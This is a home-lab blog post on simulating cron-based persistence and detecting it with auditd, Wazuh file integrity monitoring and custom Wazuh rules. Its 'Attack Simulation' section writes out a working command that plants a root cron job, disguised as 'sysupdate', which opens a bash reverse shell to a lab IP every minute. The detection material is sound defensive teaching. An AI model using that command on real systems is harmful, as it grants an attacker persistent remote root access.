---
title: "Weekly Blog 5"
date: 2026-07-04
layout: single
classes: wide
author_profile: true
comments: true
reddit_url: https://www.reddit.com/r/cybersecurityindia/s/Bj9uxC4YSN
categories: [siem, linux, privilege-escalation, home-lab]
---


This is stage 3 of my home lab attack chain. In the previous stages, I simulated an SSH brute force (T1110.001) and a SUID privilege escalation (T1548.001). Now, the attacker already has root on the machine. Now they want to make sure they keep it even if the machine reboots or the original shell dies. That's persistence.

**The fact that the cron job here runs as root and reaches back to the attacker's IP directly continues from where the SUID lab left off. If you pull the alerts from all three stages together, the story writes itself — an attacker moved from knocking on the door to owning the box to making sure they stay.**

## Attack Simulation

Simulating an attacker who already has root (continuing from the SUID lab), I dropped a malicious cron job disguised as a system update:

```bash
sudo bash -c 'echo "* * * * * root /bin/bash -i >& /dev/tcp/192.168.56.102/4444 0>&1" > /etc/cron.d/sysupdate'
```

This tells cron to open a reverse shell back to the attacker's machine every minute. The filename `sysupdate` is deliberately chosen to look like a legitimate system task at a glance — a common attacker evasion trick.

## Detection Setup

### 1. auditd Rules

auditd watches at the kernel level, it hooks into syscalls, so any process touching a watched path gets logged immediately, including the process name, user, and exact command.

Added to `/etc/audit/rules.d/audit.rules`:

```
-w /etc/cron.d/ -p wa -k cron_persistence
-w /etc/crontab -p wa -k cron_persistence
-w /var/spool/cron/crontabs/ -p wa -k cron_persistence
-w /usr/bin/crontab -p x -k cron_persistence
```

`-p wa` watches for writes and attribute changes. `-p x` watches for execution of the `crontab` binary. `-k cron_persistence` tags every matching event with a searchable key.

### 2. Wazuh FIM (syscheck)

FIM is Wazuh's own file integrity monitoring. Instead of hooking syscalls, it scans watched directories and detects when files are created, modified, or deleted, comparing hashes against a known baseline. It's a good backstop that covers what auditd might miss.

Added to the `<syscheck>` block in `/var/ossec/etc/ossec.conf`:

```xml
<directories check_all="yes" realtime="yes" report_changes="yes">/etc/cron.d</directories>
<directories check_all="yes" realtime="yes">/var/spool/cron/crontabs</directories>
```

`realtime="yes"` means it doesn't wait for a scheduled scan — it fires as soon as a change is detected.

### 3. Custom Wazuh Rules

Added to `/var/ossec/etc/rules/local_rules.xml`:

```xml
<!-- T1053.003 - Cron Persistence via auditd -->
<rule id="100201" level="12">
  <if_group>audit</if_group>
  <match>key="cron_persistence"</match>
  <description>T1053.003 - Cron persistence: write detected in cron directory (auditd)</description>
  <mitre>
    <id>T1053.003</id>
  </mitre>
  <group>persistence,cron,</group>
</rule>

<!-- T1053.003 - Cron Persistence via FIM -->
<rule id="100202" level="12">
  <if_sid>554,550</if_sid>
  <field name="file">/etc/cron.d</field>
  <description>T1053.003 - Cron persistence: new or modified file in /etc/cron.d (FIM)</description>
  <mitre>
    <id>T1053.003</id>
  </mitre>
  <group>persistence,cron,</group>
</rule>
```

One thing worth noting on rule 100201: the initial version used `<field name="audit.key">cron_persistence</field>`, but Wazuh's auditd decoder was parsing the key field as `"null"` for certain event types, so the condition never matched. Switching to `<match>key="cron_persistence"</match>` — which matches against the raw log string — fixed it. Always worth checking `alerts.json` directly if a custom auditd rule isn't firing; the parsed fields don't always look like you'd expect.

## Detection Results

Both detections fired. Here's the relevant output from `alerts.json` for rule 100201:

```
timestamp: 2026-07-05T17:10:51
rule.id: 100201
rule.level: 12
rule.description: T1053.003 - Cron persistence: write detected in cron directory (auditd)
mitre.id: T1053.003
mitre.technique: Cron

audit.syscall: openat (257)       # file creation syscall
audit.exe: /usr/bin/bash
audit.command: bash
audit.file.name: /etc/cron.d/sysupdate
nametype: CREATE
auid: 1000 (ubuntu)               # original user before sudo
uid: 0 (root)                     # effective user at time of write
```

auditd logged the exact syscall (`openat`), the process that did it (`bash`), the file created (`/etc/cron.d/sysupdate`), and both the original user and the effective root uid. That's enough to reconstruct exactly what happened and who did it.

A second alert also fired catching the cleanup step (`rm /etc/cron.d/sysupdate`) before re-planting the file — auditd is watching for deletions too, since removing a cron file is also worth knowing about.

PS: couldn't attach pics due to problem in Wazuh.

## auditd vs FIM — What's the Difference?

Both detections are monitoring the same directories but catching different things:

| | auditd | Wazuh FIM |
|---|---|---|
| **How** | Kernel syscall hook | Periodic/realtime file scan |
| **Catches** | The action — who did what, when, with what command | The result — file added, changed, or deleted |
| **Speed** | Immediate | Near-realtime (with `realtime="yes"`) |
| **Detail** | Process, user, syscall, args | File hash, permissions, owner, diff |
| **Good for** | Attribution and command visibility | Detecting stealthy file drops |

In practice, auditd is faster and more detailed for investigation. FIM is a useful backstop — if an attacker somehow bypassed auditd rules (tampered with them, used a less obvious write method), FIM would still catch the resulting file change.


## Key Takeaways

Cron-based persistence is simple to execute but easy to miss if you're not specifically watching cron directories. The files are designed to blend in. A name like `sysupdate` in `/etc/cron.d/` looks routine at first glance. This is exactly the kind of thing that shows up in post-breach forensics months after the initial compromise.

From a detection standpoint, watching `/etc/cron.d/` with auditd and FIM together gives you both the action-level and the file-level view, which makes triage much faster. The auditd alert tells you who and how. The FIM alert tells you what changed. Together they're a solid detection layer for this technique.


## Resources Used

- [Wazuh](https://wazuh.com/)
- My writeups at [Blogs](/posts/)
